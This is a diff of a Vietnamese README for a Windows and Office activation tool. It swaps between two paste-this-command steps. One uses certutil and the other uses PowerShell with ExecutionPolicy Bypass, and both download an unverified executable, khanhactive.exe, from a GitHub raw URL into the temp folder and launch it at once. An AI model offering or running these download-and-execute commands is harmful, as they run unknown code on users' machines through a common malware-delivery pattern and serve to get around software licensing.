@@ -21,15 +21,11 @@
 3. **Active cả hai** - Windows + Office cùng lúc
 4. **Kiểm tra trạng thái** - Xem tình trạng active hiện tại
 5. **Gỡ active** - Reset lại trạng thái gốc (nếu cần)
-
 ## 📥 Cách tải và chạy tool
 
-
-
-**PowerShell:**
-```powershell
-powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest https://raw.githubusercontent.com/HoangQuocKhanh0504/ACTIVE/root/khanhactive.exe -OutFile $env:TEMP\khanhactive.exe; Start-Process $env:TEMP\khanhactive.exe"
-**CMD:**
-```CMD
+### 🖥️ CMD (khuyến nghị – chạy được cả Windows lược)
+```cmd
 certutil -urlcache -split -f https://raw.githubusercontent.com/HoangQuocKhanh0504/ACTIVE/root/khanhactive.exe %TEMP%\khanhactive.exe && start "" "%TEMP%\khanhactive.exe"
+PowerShell
+powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest https://raw.githubusercontent.com/HoangQuocKhanh0504/ACTIVE/root/khanhactive.exe -OutFile $env:TEMP\khanhactive.exe; Start-Process $env:TEMP\khanhactive.exe"
 
